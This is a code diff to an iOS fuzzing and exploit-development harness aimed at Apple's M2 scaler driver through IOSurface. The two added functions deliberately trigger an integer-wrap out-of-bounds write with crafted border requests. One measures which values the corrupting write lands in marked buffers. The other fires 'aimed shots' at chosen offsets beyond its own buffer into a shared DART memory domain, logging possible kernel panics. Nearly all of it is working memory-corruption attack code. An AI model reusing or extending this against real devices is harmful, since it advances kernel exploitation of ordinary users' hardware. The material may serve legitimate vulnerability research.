@@ -19,6 +19,7 @@
 #include "fuzz.h"
 #include <IOSurface/IOSurfaceRef.h>
 #include <Foundation/Foundation.h>
+#include <UIKit/UIKit.h>
 #include <objc/runtime.h>
 #include <sys/mman.h>
 #include <stdarg.h>
@@ -15419,6 +15420,191 @@ static void p_dartmap(void) {
     LOG("[dart] done (alive)");
 }
 
+// V95-A: controlled value for the cross-request wrap write. Same E4 scheme
+// (legit-mapped marker sponge, then killshot), varying color fields, pixel
+// format, flag bits, W/H, scale params. Readback of the first corrupted page
+// tells what value the border fill actually wrote.
+static void p_dartval(void) {
+    int skip = atoi(getenv("FUZZ_DARTVAL_SKIP") ?: "0");
+    LOG("[dartval] v95a: controlled-value matrix (skip %d)", skip);
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    static const struct {
+        int fmt; int bpe;                 // sponge/dst pixel format (0 = BGRA)
+        uint32_t a, r, g, b;              // border color fields (+0xbc..+0xc8)
+        uint64_t orflags, clrcrop;        // extra +0x20 bits / crop override
+        uint32_t w, h;                    // border W/H (0 = default 0xFFFFFFE0)
+        const char *n;
+    } vars[] = {
+        { 0,4, 0,0,0,0, 0,0, 0,1, "CONTROL no-shot" },
+        { 0,4, 0xff,0xff,0xff,0xff, 0,0, 0,0, "base ff/ff" },
+        { 0,4, 0x100,0xff,0xff,0xff, 0,0, 0,0, "alpha 0x100" },
+        { 0,4, 0xffff,0xffff,0xffff,0xffff, 0,0, 0,0, "all 0xffff" },
+        { 0,4, 4,3,2,1, 0,0, 0,0, "rgba 4/3/2/1" },
+        { 0,4, 0xffffffff,0xffffffff,0xffffffff,0xffffffff, 0,0, 0,0, "all ffffffff" },
+        { 0,4, 0,0xff,0xff,0xff, 0,0, 0,0, "alpha 0" },
+        { 0,4, 0xff,0x3ff,0x3ff,0x3ff, 0,0, 0,0, "rgb 0x3ff" },
+        { 0,4, 0xff,0x8000,0x8000,0x8000, 0,0, 0,0, "rgb 0x8000" },
+        { 0,4, 0xff,0xff,0xff,0xff, 1ULL<<24,0, 0,0, "flag24" },
+        { 0,4, 0xff,0xff,0xff,0xff, 1ULL<<25,0, 0,0, "flag25" },
+        { 0,4, 0xff,0xff,0xff,0xff, 1ULL<<26,0, 0,0, "flag26" },
+        { 0,4, 0xff,0xff,0xff,0xff, 1ULL<<27,0, 0,0, "flag27" },
+        { 0,4, 0xff,0xff,0xff,0xff, 1ULL<<29,0, 0,0, "flag29" },
+        { 0,4, 0xff,0xff,0xff,0xff, 1ULL<<30,0, 0,0, "flag30" },
+        { 0,4, 0xff,0xff,0xff,0xff, 1ULL<<31,0, 0,0, "flag31" },
+        { 0,4, 0xff,0xff,0xff,0xff, 0,0, 0xFFFFFFFC,0xFFFFFFFC, "WH fffffffc" },
+        { 0,4, 0xff,0xff,0xff,0xff, 0,0, 0xFFFFFFF0,0xFFFFFFF0, "WH fffffff0" },
+        { 0,4, 0xff,0xff,0xff,0xff, 0,0, 0x80000000,0x80000000, "WH 80000000" },
+        { 0,4, 0xff,0xff,0xff,0xff, 0,0, 0xFFFFFF00,0xFFFFFF00, "WH ffffff00" },
+        { 0x52474241,4, 0xff,0xff,0xff,0xff, 0,0, 0,0, "fmt RGBA" },
+        { 0x41424752,4, 0xff,0xff,0xff,0xff, 0,0, 0,0, "fmt ABGR" },
+        { 0x6c303038,1, 0xff,0xff,0xff,0xff, 0,0, 0,0, "fmt l008" },
+        { 0,4, 0xff,0xff,0xff,0xff, 0,32ULL<<16, 0,0, "crop32" },
+        { 0,4, 0xff,0xff,0xff,0xff, 0,16ULL<<16, 0,0, "crop16" },
+    };
+    for (unsigned v = 0; v < sizeof(vars)/sizeof(vars[0]); v++) {
+        if ((int)v < skip) continue;
+        int fmt = vars[v].fmt ? vars[v].fmt : 0x42475241;
+        IOSurfaceRef b1 = make_surface_fmt(2048, 2048, 4, 0x42475241);
+        IOSurfaceRef b2 = make_surface_fmt(2048, 2048, vars[v].bpe, fmt);
+        if (!b1 || !b2) { LOG("[dartval] v%u %s: surface fail", v, vars[v].n); continue; }
+        craft_transform(req, IOSurfaceGetID(b1), IOSurfaceGetID(b2), 2048, 2048);
+        kern_return_t kr = scaler_call1(c, req);
+        if (kr) { LOG("[dartval] v%u %s: legit map kr 0x%08x — fmt unsupported?", v, vars[v].n, kr); CFRelease(b1); CFRelease(b2); continue; }
+        usleep(200000);   // let the legit scale fully complete before refilling
+        // fill markers AFTER the legit scale (v94 E4 had them destroyed by the
+        // scale itself — markers must go in last, the mapping persists).
+        for (int bi = 0; bi < 2; bi++) {   // mark BOTH src and dst sponges
+            IOSurfaceRef bs = bi ? b2 : b1;
+            if (IOSurfaceLock(bs, 0, NULL) == 0) {
+                uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(bs);
+                size_t total = (size_t)IOSurfaceGetAllocSize(bs);
+                for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+                    memset(base + p, (int)(((p >> 12) + (bi ? 0 : 0x80)) & 0xff), 0x1000);
+                IOSurfaceUnlock(bs, 0, NULL);
+            }
+        }
+        IOSurfaceRef s = make_surface(64, 64);
+        IOSurfaceRef d = make_surface(64, 64);
+        IOSurfaceID si = IOSurfaceGetID(s), di = IOSurfaceGetID(d);
+        craft_transform(req, si, di, 64, 64);
+        scaler_call1(c, req);
+        usleep(30000);
+        uint32_t w = vars[v].w ? vars[v].w : 0xFFFFFFE0;
+        uint32_t h = vars[v].h ? vars[v].h : 0xFFFFFFE0;
+        border_payload(req, si, di, 32, 32, w, h, 32, 32);
+        *(uint32_t *)(req + 0xbc) = vars[v].a;
+        *(uint32_t *)(req + 0xc0) = vars[v].r;
+        *(uint32_t *)(req + 0xc4) = vars[v].g;
+        *(uint32_t *)(req + 0xc8) = vars[v].b;
+        *(uint64_t *)(req + 0x20) |= vars[v].orflags;
+        if (vars[v].clrcrop) { *(uint64_t *)(req + 0x38) = vars[v].clrcrop; *(uint64_t *)(req + 0x40) = vars[v].clrcrop; }
+        if (vars[v].h == 1) {
+            LOG("[dartval] v%u %s: no shot (control)", v, vars[v].n);
+        } else {
+            LOG("[dartval] v%u %s: shot...", v, vars[v].n);
+            kr = scaler_call1(c, req);
+        }
+        // readback BOTH sponges (b1 markers are page+0x80, b2 markers are page)
+        for (int bi = 0; bi < 2; bi++) {
+        IOSurfaceRef bs = bi ? b2 : b1;
+        long corrupt = 0; size_t first = 0;
+        if (IOSurfaceLock(bs, kIOSurfaceLockReadOnly, NULL) == 0) {
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(bs);
+            size_t total = (size_t)IOSurfaceGetAllocSize(bs);
+            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+                if (base[p] != (uint8_t)(((p >> 12) + (bi ? 0 : 0x80)) & 0xff)) { if (!corrupt) first = p; corrupt++; }
+            if (corrupt) {
+                size_t p = first;
+                LOG("[dartval] v%u %s [%s] -> kr 0x%08x | CORRUPT %ld pages @0x%zx: %02x %02x %02x %02x %02x %02x %02x %02x",
+                    v, vars[v].n, bi ? "dst" : "SRC", kr, corrupt, p,
+                    base[p], base[p+1], base[p+2], base[p+3], base[p+4], base[p+5], base[p+6], base[p+7]);
+            } else {
+                LOG("[dartval] v%u %s [%s] -> kr 0x%08x | no corruption", v, vars[v].n, bi ? "dst" : "SRC", kr);
+            }
+            IOSurfaceUnlock(bs, kIOSurfaceLockReadOnly, NULL);
+        }
+        }
+        CFRelease(b1); CFRelease(b2); CFRelease(s); CFRelease(d);
+        usleep(100000);
+    }
+    LOG("[dartval] done (alive)");
+}
+
+// V95-B: aimed shots beyond our sponge into the shared persistent DART domain.
+static void p_dartaim(void) {
+    int skip = atoi(getenv("FUZZ_DARTAIM_SKIP") ?: "0");
+    LOG("[dartaim] v95b: aimed shots (skip %d)", skip);
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    // system scaler activity: looping scale animation on the UI
+    dispatch_async(dispatch_get_main_queue(), ^{
+        @autoreleasepool {
+            UIWindow *win = nil;
+            for (UIScene *sc in [UIApplication sharedApplication].connectedScenes)
+                if ([sc isKindOfClass:[UIWindowScene class]])
+                    for (UIWindow *w in ((UIWindowScene *)sc).windows) if (w.isKeyWindow) win = w;
+            if (win) {
+                UIView *v = [[UIView alloc] initWithFrame:CGRectMake(40, 40, 700, 700)];
+                v.backgroundColor = [UIColor colorWithRed:1 green:0 blue:1 alpha:0.5];
+                [win addSubview:v];
+                [UIView animateWithDuration:0.4 delay:0
+                                    options:UIViewAnimationOptionAutoreverse | UIViewAnimationOptionRepeat | UIViewAnimationOptionAllowUserInteraction
+                                 animations:^{ v.transform = CGAffineTransformMakeScale(0.31, 0.31); }
+                                 completion:nil];
+            }
+        }
+    });
+    // sponge (16MB, markers) + legit map
+    IOSurfaceRef b1 = make_surface(2048, 2048);
+    IOSurfaceRef b2 = make_surface(2048, 2048);
+    if (!b1 || !b2) return;
+    if (IOSurfaceLock(b2, 0, NULL) == 0) {
+        uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(b2);
+        size_t total = (size_t)IOSurfaceGetAllocSize(b2);
+        for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+            memset(base + p, (int)((p >> 12) & 0xff), 0x1000);
+        IOSurfaceUnlock(b2, 0, NULL);
+    }
+    craft_transform(req, IOSurfaceGetID(b1), IOSurfaceGetID(b2), 2048, 2048);
+    kern_return_t kr = scaler_call1(c, req);
+    LOG("[dartaim] sponge mapped -> kr 0x%08x", kr);
+    IOSurfaceRef s = make_surface(64, 64);
+    IOSurfaceRef d = make_surface(64, 64);
+    IOSurfaceID si = IOSurfaceGetID(s), di = IOSurfaceGetID(d);
+    craft_transform(req, si, di, 64, 64);
+    scaler_call1(c, req);
+    usleep(50000);
+    static const uint32_t aims[] = { 0x40, 0x400, 0x1000, 0x8000, 0x10000, 0x80000,
+                                     0x100000, 0x400000, 0x1000000, 0x10000000,
+                                     0x40000000, 0x80000000 };
+    for (unsigned i = 0; i < sizeof(aims)/sizeof(aims[0]); i++) {
+        if ((int)i < skip) continue;
+        uint32_t X = aims[i];
+        // keep X+W wrapping to exactly 0x10 like the validated baseline
+        uint32_t W = (uint32_t)(0x100000010ULL - X);
+        border_payload(req, si, di, X, X, W, W, 32, 32);
+        time_t t = time(NULL);
+        LOG("[dartaim] t=%ld aim +0x%x: shot %u (PANIC possible)", (long)t, X, i);
+        kr = scaler_call1(c, req);
+        LOG("[dartaim] t=%ld aim +0x%x shot %u -> kr 0x%08x", (long)time(NULL), X, i, kr);
+        usleep(200000);
+    }
+    // control: sponge must be untouched if we aimed past it
+    if (IOSurfaceLock(b2, kIOSurfaceLockReadOnly, NULL) == 0) {
+        uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(b2);
+        size_t total = (size_t)IOSurfaceGetAllocSize(b2);
+        long corrupt = 0;
+        for (size_t p = 0; p + 0x1000 <= total; p += 0x1000)
+            if (base[p] != (uint8_t)((p >> 12) & 0xff)) corrupt++;
+        LOG("[dartaim] control: sponge corrupt pages %ld (0 = aimed away from us)", corrupt);
+        IOSurfaceUnlock(b2, kIOSurfaceLockReadOnly, NULL);
+    }
+    LOG("[dartaim] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -15549,6 +15735,8 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_DARTVAL")) { p_dartval(); LOG("[probe13] dartval-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_DARTAIM")) { p_dartaim(); LOG("[probe13] dartaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_DARTMAP")) { p_dartmap(); LOG("[probe13] dartmap-only mode, stop"); return NULL; }
         if (getenv("FUZZ_JPEG")) { p_jpeg(); LOG("[probe13] jpeg-only mode, stop"); return NULL; }
         if (getenv("FUZZ_PINNED")) { p_pinned(); LOG("[probe13] pinned-only mode, stop"); return NULL; }
